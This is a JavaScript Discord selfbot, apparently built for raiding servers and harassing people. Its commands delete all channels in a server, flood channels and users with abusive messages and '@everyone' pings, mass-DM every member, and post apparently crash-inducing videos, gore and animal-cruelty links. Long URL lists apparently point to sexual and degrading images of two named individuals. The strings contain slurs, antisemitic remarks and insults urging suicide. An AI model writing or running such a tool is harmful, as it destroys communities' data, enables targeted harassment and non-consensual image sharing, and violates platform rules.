import Discord from 'v11-discord.js';
const client = new Discord.Client();
const prefix = '£';
/*const fs = require('fs')*/
let msgtotal = 0;
const paved = `@everyone\nhttps://cdn.discordapp.com/attachments/417444017966546944/488327431456030748/1528622831687.jpg\nhttps://cdn.discordapp.com/attachments/182104813532610561/506546854666698752/01.png\nhttps://cdn.discordapp.com/attachments/493449316883496980/498950927529672714/Shayyy.gif\nhttps://cdn.discordapp.com/attachments/182104813532610561/506546874434453504/1530018389353.png`
let lope = ['https://cdn.discordapp.com/attachments/827895267201777685/835296495954821120/77900799_q.jpg', 'https://cdn.discordapp.com/attachments/827895267201777685/835296503786242068/77900780_q.jpg', 'https://cdn.discordapp.com/attachments/827895267201777685/835296534270050314/photo_2019-08-01_18-02-37.jpg', 'https://cdn.discordapp.com/attachments/833842551101325322/833849795172237362/DSC01725.jpg', 'https://cdn.discordapp.com/attachments/833842551101325322/833849790185472049/784_1000.jpg', 'https://cdn.discordapp.com/attachments/833842551101325322/833849787861434449/CxsQHZcWgAABPwA.jpg', 'https://cdn.discordapp.com/attachments/833842551101325322/833849786427113532/exhib1.jpeg', 'https://cdn.discordapp.com/attachments/833842551101325322/833849757708582922/EJM94ydXUAAF_qS.png', 'https://cdn.discordapp.com/attachments/833842551101325322/833849752868356177/EPbZY4tXsAA12Li.png', 'https://cdn.discordapp.com/attachments/833842551101325322/833849751064674314/chiottard.jpg', 'https://cdn.discordapp.com/attachments/833842551101325322/833849749407793182/CvObLxVWYAAUOa_.png', 'https://cdn.discordapp.com/attachments/833842551101325322/833849746803916860/EJNN5-1WwAEg6sp.png', 'https://cdn.discordapp.com/attachments/833842551101325322/833849744937320469/tumblr_pcft030try1rdugyio1_400.png', 'https://cdn.discordapp.com/attachments/833842551101325322/833849742718533642/CvOfTE3XgAAkJ0C.png', 'https://cdn.discordapp.com/attachments/833842551101325322/833850275109797888/IMG_20210325_223609_885.jpg', 'https://cdn.discordapp.com/attachments/833842551101325322/833850349805764619/CvOlcQbWgAA-8e4.jpg', 'https://cdn.discordapp.com/attachments/833842551101325322/833849740957450240/image1.png', 'https://cdn.discordapp.com/attachments/833842551101325322/833849739056644126/Tajs2Mks_400x400.png', 'https://cdn.discordapp.com/attachments/833842551101325322/833849727527157821/20013591.png', 'https://cdn.discordapp.com/attachments/833842551101325322/833849724859449444/image0.jpg', 'https://cdn.discordapp.com/attachments/833842551101325322/833849723869462579/suce-zob.png', 'https://cdn.discordapp.com/attachments/833842551101325322/833849722611302500/DSC031822.jpg', 'https://cdn.discordapp.com/attachments/833842551101325322/833849722484555817/DSC031841.jpg', 'https://cdn.discordapp.com/attachments/833842551101325322/833849720799363099/bite_route.png', 'https://cdn.discordapp.com/attachments/833842551101325322/833849719754850334/LOPEgifgif.gif', 'https://cdn.discordapp.com/attachments/833842551101325322/833849696819740702/IMG_20210325_223609_885.jpg', 'https://cdn.discordapp.com/attachments/833842551101325322/833849696157827102/EiQ294DX0AALjq-.jpg', 'https://cdn.discordapp.com/attachments/833842551101325322/833849796649287730/77900792_q.png', 'https://cdn.discordapp.com/attachments/833842551101325322/833849798301581322/77900894_q.png', 'https://cdn.discordapp.com/attachments/566726587064778772/832294561962524672/77900784_q.png', 'https://cdn.discordapp.com/attachments/600998134587588625/832289868050464778/lope.png', 'https://cdn.discordapp.com/attachments/600998134587588625/832289865248014356/garcia.PNG', 'https://cdn.discordapp.com/attachments/600998134587588625/832289863927726090/EiI7d5yXsAAM2Hy.png', 'https://cdn.discordapp.com/attachments/600998134587588625/832289863675150376/EZsQWlXXQAEnMmb.jpg', 'https://cdn.discordapp.com/attachments/600998134587588625/832289862920568893/EXgpWOSXsAA51l3.jpg', 'https://cdn.discordapp.com/attachments/600998134587588625/832289862920568893/EXgpWOSXsAA51l3.jpg', 'https://cdn.discordapp.com/attachments/600998134587588625/832289834755817512/tumblr_pcsivnan1a1rdugyio1_400.png', 'https://cdn.discordapp.com/attachments/600998134587588625/832289823079399444/Eb8OSsgUwAAuURJ.png', 'https://cdn.discordapp.com/attachments/600998134587588625/832289811095224370/754804122905083984.jpg', 'https://cdn.discordapp.com/attachments/600998134587588625/832289789889347614/1570345459098.jpeg', 'https://cdn.discordapp.com/attachments/834765568640024619/834782419534086204/gdsfgds.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834782427896348672/joyy.png', 'https://cdn.discordapp.com/attachments/834765568640024619/834782424760057926/image0_1.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834782386033524736/DSCF2287.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834782327790895154/tumblr_pc68bdO4Ih1rdugyio1_500.png', 'https://cdn.discordapp.com/attachments/834765568640024619/834782326613475388/tumblr_p1uppsRdWC1vmt7v9o1_1280.png', 'https://cdn.discordapp.com/attachments/834765568640024619/834783153180770334/photo_2019-08-01_18-02-37.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834783296377454682/cochon.jpeg', 'https://cdn.discordapp.com/attachments/834765568640024619/834783315415924746/71007382_q.png', 'https://cdn.discordapp.com/attachments/834765568640024619/834783326262263858/a_dispo.png', 'https://cdn.discordapp.com/attachments/834765568640024619/834783172659118130/kuhguelle1.jpg', 'https://cdn.discordapp.com/attachments/821330559631491112/834925587306512414/71006931_q.jpg', 'https://cdn.discordapp.com/attachments/821330559631491112/834925603890397275/19830381_m.jpg', 'https://cdn.discordapp.com/attachments/821330559631491112/834925654297280583/19829809_m.jpg', 'https://cdn.discordapp.com/attachments/821330559631491112/834925943721426984/77900780_q.jpg', 'https://cdn.discordapp.com/attachments/821330559631491112/834926011451179068/jus-face2.jpg', 'https://cdn.discordapp.com/attachments/821330559631491112/834927303464845332/19830129_m.jpg', 'https://cdn.discordapp.com/attachments/821330559631491112/834927331318825020/19829661_m.jpg', 'https://cdn.discordapp.com/attachments/821330559631491112/834927331670753330/ET75is0WkAAbbzx.png', 'https://cdn.discordapp.com/attachments/834840152017993858/834928289227079721/19829810_m.jpg', 'https://cdn.discordapp.com/attachments/834840152017993858/834928517367857162/sperm-bouche2.jpg', 'https://cdn.discordapp.com/attachments/834840152017993858/834928721752227890/D-s3xGtXoAAkjDb-removebg-preview.png', 'https://cdn.discordapp.com/attachments/834840152017993858/834928883991445534/71007479_q.jpg', 'https://cdn.discordapp.com/attachments/816384740919083100/836285090605957120/Pierre_garcia_4.png', 'https://cdn.discordapp.com/attachments/816384740919083100/836284957235871844/Pierre_garcia_2.png', 'https://cdn.discordapp.com/attachments/816384740919083100/836284453537054790/Pierre_garcia_10.png', 'https://cdn.discordapp.com/attachments/816384740919083100/836284440564203590/Pierre_garcia_7.png', 'https://cdn.discordapp.com/attachments/816384740919083100/836284436290338923/Pierre_garcia_6.png', 'https://cdn.discordapp.com/attachments/816384740919083100/836284424155824229/Pierre_garcia_3.png', 'https://cdn.discordapp.com/attachments/816384740919083100/836284366001930250/image0.jpg', 'https://cdn.discordapp.com/attachments/816384740919083100/836284364970655825/Ejai4OZXkAAlDR7.jpg', 'https://media.discordapp.net/attachments/816384740919083100/836283799075422268/IMG_7474.JPG?width=901&height=676', 'https://cdn.discordapp.com/attachments/816384740919083100/836283800999821422/IMG_7475.JPG', 'https://cdn.discordapp.com/attachments/816384740919083100/836281681161093140/D-s3xGtXoAAkjDb.png', 'https://cdn.discordapp.com/attachments/816384740919083100/836281338009092106/D-s3dElXoAA1kp_.png', 'https://cdn.discordapp.com/attachments/816384740919083100/836281489414160415/D6jJOD2XkAAGhcd.png', 'https://cdn.discordapp.com/attachments/816384740919083100/836283712660439140/KZRflZq7pG6tOi3i.mp4', 'https://cdn.discordapp.com/attachments/816384740919083100/836283870118150164/suce_la_merde.jpg', 'https://cdn.discordapp.com/attachments/816384740919083100/836285090605957120/Pierre_garcia_4.png']
let loperandom = Math.floor(Math.random() * lope.length)
let fabrice = ['https://cdn.discordapp.com/attachments/834765568640024619/834765653906817064/Servante_1.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834779194138689566/20210401_133002.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834795118946025552/fadoigtt.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834795159547543622/IMG_2759.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834795197857660979/poub.png', 'https://cdn.discordapp.com/attachments/834765568640024619/834765655638016040/serveur_detruit_par_fabrice_la_pute_pour_radio_participative.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765658523697192/unknown_3.png', 'https://cdn.discordapp.com/attachments/834765568640024619/834765660097216532/Vos_insultes.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765660545482842/youtube.png', 'https://cdn.discordapp.com/attachments/834765568640024619/834765662316265482/3.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765664673464340/182_1000.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765665621508136/207_1000.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765693105995816/A_poil_dans_la_cave_2.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765696202047528/banana.png', 'https://cdn.discordapp.com/attachments/834765568640024619/834765698906980382/dechet_leche_les_chiottes_daire_autoroute.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765701343871056/exhibe_devant_le_train.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765703188840478/fabpeel.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765738555473940/IMG_5820.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765739134550076/IMG_8606.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765742591049768/IMG_9489.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765747262980166/nu_dans_une_benne.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765748891156520/nu_euromaster.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765749506670602/On_me_pisse_dessus_2.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834765750308044820/photo_2021-03-30_22-33-27.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834766077606756383/218_1000.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834766081511391262/cul_offert.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834766081318322176/118627181_170280701390465_6197892578982416780_n.png', 'https://cdn.discordapp.com/attachments/834765568640024619/834766082812018688/exhibe_en_exterieur.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834766088092516382/IMAG0003.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834766090135273512/IMG_6951.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834766092483952650/photo_2021-03-20_10-09-40.jpg', 'https://cdn.discordapp.com/attachments/825019220395425843/834721515899453440/IMAG0013.JPG', 'https://cdn.discordapp.com/attachments/825019220395425843/834720465305206864/IMG_4983.JPG', 'https://cdn.discordapp.com/attachments/825019220395425843/834719082640834620/pute_maquille.jpg', 'https://cdn.discordapp.com/attachments/825019220395425843/834718724324851712/sperme.jpg', 'https://cdn.discordapp.com/attachments/825019220395425843/834708256705871883/photo_2021-04-22_10-31-23.jpg', 'https://cdn.discordapp.com/attachments/825019220395425843/834708235713904650/photo_2021-04-22_10-31-05.jpg', 'https://cdn.discordapp.com/attachments/825019220395425843/834708188434923580/photo_2021-04-22_10-29-49.jpg', 'https://cdn.discordapp.com/attachments/825019220395425843/834721515899453440/IMAG0013.JPG', 'https://cdn.discordapp.com/attachments/825019220395425843/834708262242222100/photo_2021-04-22_10-31-28.jpg', 'https://cdn.discordapp.com/attachments/825019220395425843/834708251210678302/photo_2021-04-22_10-31-18.jpg', 'https://cdn.discordapp.com/attachments/825019220395425843/834708214062776350/photo_2021-04-22_10-30-36.jpg', 'https://cdn.discordapp.com/attachments/825019220395425843/834718211105882182/Soubrette_7.JPG', 'https://cdn.discordapp.com/attachments/825019220395425843/834708182609297408/photo_2021-04-21_12-49-23.jpg', 'https://cdn.discordapp.com/attachments/825019220395425843/834707289021743164/photo_2020-08-06_08-53-54.jpg', 'https://cdn.discordapp.com/attachments/825019220395425843/834706773755559936/IMG_8595.JPG', 'https://cdn.discordapp.com/attachments/834765568640024619/834766081130233916/20210331_230742.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834779099351744563/221_1000.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834779194138689566/20210401_133002.jpg', 'https://cdn.discordapp.com/attachments/834765568640024619/834779210852990976/20210402_203102.jpg']
console.log('LopeSelf by atomkern')
console.log(`Nombre total d'image de lope75015 : ${lope.length}`)
console.log(`Nombre total d'image de fabriceledechet : ${fabrice.length}`)


client.on('ready', () => {
	console.log(`Logged in as ${client.user.tag}!`);
	/*setInterval(function () {
		messagepresence = ['Tirage de Pisse Gratuit', 'en train de bouffer la merde', 'le prolapse']
		let presence = Math.floor(Math.random() * messagepresence.length);
		client.user.setActivity(messagepresence[presence], {
			type: `streaming`,
			url: `https://www.twitch.tv/prolapse`
		})
	}, 10000)*/
});

client.on('message', async message => {
	if (message.author.id != client.user.id) return;

	let cmd = message.content.split(" ")[0]
	cmd = cmd.slice(prefix.length)
	let args = message.content.split(" ").slice(1)

	/* 
		fs.appendFileSync('message.txt', `[${client.user.username}] ${message.content}\n`, function (err) {
			if (err) throw err;
		});
		console.log(`[${client.user.username}] ${message.content}`);
	*/
	switch (cmd) {
		case 'ping':
			message.edit(`**Ping** : ${Date.now() - message.createdTimestamp}ms`)
			break;
		case 'msgtotal':
			message.edit(`Le total de message depuis le lancement du self est de ${msgtotal}`)
			break;
		case 'lope':
			loperandom = Math.floor(Math.random() * lope.length);
			message.edit(lope[loperandom])
			break;
		case 'fabrice':
			let fabricerandom = Math.floor(Math.random() * lope.length);
			message.edit(fabrice[fabricerandom])
			break;
		case 'stats':
			message.edit(`Je suis sur **${client.guilds.size}** serveurs\nLe compte date du ${client.user.createdAt} !\n Il y a ${lope.length} images de lope75015, ${fabrice.length} images de fabriceledechet (soit un total de ${fabrice.length + lope.length} images)`)
			break;
		case 'sourire':
			function sourire() {
				message.edit(`
⣿⣿⣿⣿⣿⣿⡟⠁⠄⠄⠄⠄⣠⣤⣴⣶⣶⣶⣶⣤⡀⠈⠙⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠄⠈⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠁⠄⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⢺⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡄⠄⠄⠄⠙⠻⠿⣿⣿⣿⣿⠿⠿⠛⠛⠻⣿⡄⠄⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⠄⠄⠁ 👁️ ⠄⢹⣿⡗⠄ 👁️ ⢄⡀⣾⢀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⠘⠄⠄⠄⢀⡀⠄⣿⣿⣷⣤⣤⣾⣿⣿⣿⣧⢸⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⠄⣰⣿⡿⠟⠃⠄⣿⣿⣿⣿⣿⡛⠿⢿⣿⣷⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡄⠈⠁⠄⠄⠄⠄⠻⠿⢛⣿⣿⠿⠂⠄⢹⢹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡐⠐⠄⠄⣠⣀⣀⣚⣯⣵⣶⠆⣰⠄⠞⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⡄⠄⠄⠈⠛⠿⠿⠿⣻⡏⢠⣿⣎⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⠟⠛⠄⠄⠄⠄⠙⣛⣿⣿⣵⣿⡿⢹⡟⣿⣿⣿⣿⣿⣿⣿
    `)
				message.edit(`
⣿⣿⣿⣿⣿⣿⡟⠁⠄⠄⠄⠄⣠⣤⣴⣶⣶⣶⣶⣤⡀⠈⠙⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠄⠈⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠁⠄⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⢺⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡄⠄⠄⠄⠙⠻⠿⣿⣿⣿⣿⠿⠿⠛⠛⠻⣿⡄⠄⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⠄⠄⠁        ⠄⢹⣿⡗⠄        ⢄⡀⣾⢀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⠘⠄⠄⠄⢀⡀⠄⣿⣿⣷⣤⣤⣾⣿⣿⣿⣧⢸⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⠄⣰⣿⡿⠟⠃⠄⣿⣿⣿⣿⣿⡛⠿⢿⣿⣷⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡄⠈⠁⠄⠄⠄⠄⠻⠿⢛⣿⣿⠿⠂⠄⢹⢹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡐⠐⠄⠄⣠⣀⣀⣚⣯⣵⣶⠆⣰⠄⠞⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⡄⠄⠄⠈⠛⠿⠿⠿⣻⡏⢠⣿⣎⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⠟⠛⠄⠄⠄⠄⠙⣛⣿⣿⣵⣿⡿⢹⡟⣿⣿⣿⣿⣿⣿⣿
      `)
			}
			setInterval(sourire, 1500)
			break;
		case 'rchannel':
			message.edit('Suppression de tous les channels...').then((m) => m.delete({
				timeout: 500
			})).catch(() => {})
			await setTimeout[Object.getOwnPropertySymbols(setTimeout)[0]](1000)
			message.guild.channels.forEach((c) => {
				c.delete().catch(() => {})
			})
			break;
		case 'niveau':
			let temps = args
			message.delete()

			function msg() {
				let prolapsus = ['Je suis un prolapse !', '<@698219624948432896> je t\'aime !',
					'Putain, on voit mon trou...', `Tu n'es bon qu'à bouffer la merde. Tu n'as ni talent particulier, ni fortune, ni diplôme, ni quoique ce soit qui pourrait te permettre de tirer ton épingle du jeu de la vie. Non, toi ta place c'est celle du déchet, de la merde infâme que toute cette société rejette. Sur qui, tout le monde crache dessus. Tu n'es qu'une merde, un sombre déchet qui clôturera assez rapidement sa courte, mais pénible existence de déchet. Je peux te l'assurer.`,
					'Je suis un dechet quoi !', 'https://media.discordapp.net/attachments/566726587064778772/832725448751317022/0001.png',
					'<@698219624948432896> allo !', '<:lope:755493969781194843>',
					'tu connais jew it ?', 'noooooooooooon'
				]
				let pd = Math.floor(Math.random() * prolapsus.length);
				message.channel.send(prolapsus[pd])
			}
			setInterval(msg, temps)
			break;
		case 'spamuser':
			let nigger = args
			if (args == '') return message.edit('suicide toi et mets l\'id de quelqu\'un')
			message.edit(`<@${nigger}>`)

			function spamuser() {
				message.channel.send(`<@${nigger}>, je suis un prolapse !`)
			}
			setInterval(spamuser, 1500)
			break;
		case 'mpall':
			message.guild.members.forEach((m) => {
				m.send('https://media.discordapp.net/attachments/600998134587588625/832289862920568893/EXgpWOSXsAA51l3.jpg').catch(() => {
					console.info(`[X] Impossible de mp : ${m.user.tag}`);
				})
			})
			break;
		case 'spammsg':
			let messaged = args.join(' ')
			console.log(messaged)
			if (messaged == 'lope[]') {
				messaged == lope[loperandom]
			}
			message.delete()

			function spam() {
				message.channel.send(`${messaged}`)
			}
			setInterval(spam, 1000)
			break;
		case 'loped':
			message.edit('https://media.discordapp.net/attachments/600998134587588625/832289862920568893/EXgpWOSXsAA51l3.jpg')
				.catch((e) => {
					console.info(e)
				})

			function trou() {
				loperandom = Math.floor(Math.random() * lope.length)
				message.channel.send(`@everyone ${lope[loperandom]}`)
			}
			setInterval(trou, 1000)
			break;
		case 'fabriced':
			message.edit(fabrice[0])

			function fabricetrou() {
				let fabricerandom = Math.floor(Math.random() * fabrice.length)
				message.channel.send(`@everyone ${fabrice[fabricerandom]}`)
			}
			setInterval(fabricetrou, 1000)
			break;
		case 'gore':
			setInterval(function () {
				message.channel.send(paved)
			}, 1000)
			break;
		case 'crash':
				message.channel.send('https://giant.gfycat.com/PracticalCleanCaterpillar.mp4\nhttps://giant.gfycat.com/PracticalCleanCaterpillar.mp4\nhttps://giant.gfycat.com/PracticalCleanCaterpillar.mp4')
			break;
		case 'mpcrash':
			//message.guild.members.map(m => m.send('https://giant.gfycat.com/PracticalCleanCaterpillar.mp4').catch(() => { console.log(`Impossible de mp ${m.user.tag}`) }))
			message.guild.members.forEach(member => {
				message.edit(`A partir de maintenant plus de dignite !!!`)
				member.send('https://images-ext-1.discordapp.net/external/bMY7R23HP9AbjmgixSACXCvlS1bbHMKg2n38T1qJbrU/https/giant.gfycat.com/FirmDecimalHippopotamus.mp4').catch(() => console.log("Impossible de mp " + member.user.tag))
			})
			break;
		case 'chat':
			message.delete()
				.catch(() => {})
			chatArray = ['https://cdn.discordapp.com/attachments/814547866709131315/839091524729700412/chaton.png', 'https://cdn.discordapp.com/attachments/814547866709131315/839168069506957392/chaton2.png', 'https://cdn.discordapp.com/attachments/814547866709131315/839177255749025852/chaton3.png', 'https://cdn.discordapp.com/attachments/814547866709131315/839177271658545212/chaton4.png', 'https://cdn.discordapp.com/attachments/787668805266571265/792417268528578600/video_sauvgarder_de_MC_Roblox_CRAFTER_les_4_video_ou_il_tue_des_chat.mp4']

			function chat() {
				chatRandom = Math.floor(Math.random() * chatArray.length)
				message.channel.send(`@everyone ${chatArray[chatRandom]}`)
			}
			setInterval(chat, 1000)
			break;
		default:
			msgtotal = msgtotal + 1
			break;
	}
});

client.login('TOKEN_ICI_MASSI')
